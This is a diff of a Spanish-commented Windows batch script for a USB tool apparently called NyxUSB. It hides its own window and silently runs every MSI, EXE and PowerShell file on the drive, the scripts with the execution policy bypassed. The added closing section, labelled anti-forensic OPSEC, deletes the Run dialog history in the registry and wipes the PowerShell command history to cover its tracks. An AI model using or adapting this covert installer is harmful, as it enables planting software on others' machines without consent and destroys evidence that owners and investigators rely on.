@@ -1,51 +1,65 @@
 @echo off
 
-:: ====================================================
-::               BLOQUE DE CONFIGURACION
-:: ====================================================
-:: Nombre de la etiqueta de volumen de tu NyxUSB
-set "NOMBRE_USB=Nyx"
-
-:: Parametro silencioso universal (Por defecto /S sirve para la mayoria)
-:: Si el instalador requiere otro (ej. /VERYSILENT o /quiet), se cambia aqui:
-set "PARAM_SILENCIOSO=/S"
-:: ====================================================
-
-
 :: Ejecutarse en segundo plano si no lo esta
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
     exit
 )
 
-:: Buscar la letra de la unidad USB por su etiqueta de volumen
-for /f "delims=" %%D in ('powershell -NoProfile -Command "(Get-Volume | Where-Object {$_.FileSystemLabel -eq '%NOMBRE_USB%'}).DriveLetter"') do (
-    set "DRIVE=%%D"
+:: ====================================================
+::               RESOLUCION DINAMICA DE RUTAS
+:: ====================================================
+set "USB_ROOT=%~dp0"
+set "FOLDER_DATA=%USB_ROOT%Data"
+if exist "%USB_ROOT%..\..\Data" set "FOLDER_DATA=%USB_ROOT%..\..\Data"
+if not exist "%FOLDER_DATA%" mkdir "%FOLDER_DATA%" 2>nul
+
+set "LOG_FILE=%FOLDER_DATA%\install_%COMPUTERNAME%.log"
+
+:: Localizar carpeta de instaladores (soporta variantes comunes)
+set "CARPETA_PROGS="
+if exist "%USB_ROOT%programas" set "CARPETA_PROGS=%USB_ROOT%programas"
+if exist "%USB_ROOT%CARPETA_PROGS" set "CARPETA_PROGS=%USB_ROOT%CARPETA_PROGS"
+if exist "%USB_ROOT%installers" set "CARPETA_PROGS=%USB_ROOT%installers"
+
+if "%CARPETA_PROGS%"=="" (
+    echo [%DATE% %TIME%] No se encontro carpeta de programas en %USB_ROOT% >> "%LOG_FILE%"
+    goto :cleanup
 )
 
-:: Si no encuentra la USB con ese nombre, aborta el script
-if "%DRIVE%"=="" exit
-
-:: Definir las rutas de origen basadas en la ubicacion dinamica de la USB
-set "DESTINO=%DRIVE%:\"
-set "CARPETA_PROGS=%DESTINO%programas"
-
+:: Parametro silencioso para ejecutables (.exe)
+set "PARAM_SILENCIOSO=/S"
 
 :: ====================================================
 ::        DETECCION E INSTALACION DINAMICA
 :: ====================================================
+echo [%DATE% %TIME%] Iniciando instalacion desde %CARPETA_PROGS% >> "%LOG_FILE%"
 
-if exist "%CARPETA_PROGS%" (
-    
-    :: El bucle busca el primer archivo .exe dentro de la carpeta y lo ejecuta
-    for %%F in ("%CARPETA_PROGS%\*.exe") do (
-        start /wait "" "%%F" %PARAM_SILENCIOSO%
-        
-        :: Rompe el bucle inmediatamente para que solo instale un programa
-        goto :final
-    )
-
+:: 1. Paquetes MSI
+for %%F in ("%CARPETA_PROGS%\*.msi") do (
+    echo [%DATE% %TIME%] Instalando MSI: %%~nxF >> "%LOG_FILE%"
+    msiexec.exe /i "%%F" /qn /norestart
 )
 
-:final
+:: 2. Instaladores ejecutables (.exe)
+for %%F in ("%CARPETA_PROGS%\*.exe") do (
+    echo [%DATE% %TIME%] Ejecutando EXE: %%~nxF >> "%LOG_FILE%"
+    start /wait "" "%%F" %PARAM_SILENCIOSO%
+)
+
+:: 3. Scripts de PowerShell (.ps1)
+for %%F in ("%CARPETA_PROGS%\*.ps1") do (
+    echo [%DATE% %TIME%] Ejecutando script PowerShell: %%~nxF >> "%LOG_FILE%"
+    powershell -NoProfile -ExecutionPolicy Bypass -File "%%F"
+)
+
+echo [%DATE% %TIME%] Proceso de instalacion finalizado. >> "%LOG_FILE%"
+
+:cleanup
+:: ====================================================
+::               LIMPIEZA ANTI-FORENSE (OPSEC)
+:: ====================================================
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
+
 exit
